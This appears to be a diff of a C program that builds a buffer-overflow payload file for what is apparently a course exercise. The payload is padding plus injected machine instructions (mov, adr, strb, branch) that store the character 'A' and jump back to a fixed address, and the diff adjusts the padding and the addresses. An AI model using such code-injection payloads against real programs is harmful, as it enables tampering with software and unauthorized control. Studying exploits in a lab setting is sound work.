@@ -16,7 +16,7 @@ int main()
     /* Nullbyte at the end of the name */
     putc(0, psFile);
     /* Nullbytes for padding*/
-    for (i = 0; i < 2; i++)
+    for (i = 0; i < 6; i++)
     {
         putc(0, psFile);
     }
@@ -25,16 +25,19 @@ int main()
     curInstruction = MiniAssembler_mov(0, 0x41);
     fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);
 
-    curInstruction = MiniAssembler_adr(1, 0x420044, 0x42006c);
+    /* adr */
+    curInstruction = MiniAssembler_adr(1, 0x420044, 0x420070);
     fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);
 
+    /* strb */
     curInstruction = MiniAssembler_strb(0, 1);
     fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);
 
-    curInstruction = MiniAssembler_b(0x40089c, 0x420074);
+    /* */
+    curInstruction = MiniAssembler_b(0x40089c, 0x420078);
     fwrite(&curInstruction, sizeof(unsigned int), 1, psFile);
 
-    for (i = 0; i < 16; i++)
+    for (i = 0; i < 12; i++)
     {
         putc(0, psFile);
     }
